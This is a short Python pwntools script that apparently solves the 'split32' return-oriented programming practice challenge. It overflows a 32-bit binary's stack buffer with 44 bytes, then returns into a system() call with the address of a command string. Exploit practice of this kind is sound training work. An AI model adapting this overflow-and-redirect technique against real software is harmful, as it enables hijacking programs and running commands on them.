from pwn import *

context.bits = 32
p = process("./split32")

system = 0x0804861a
bincat = 0x0804a030

payload = b"A"*44 + p32(system) + p32(bincat)

p.send(payload)
p.interactive()
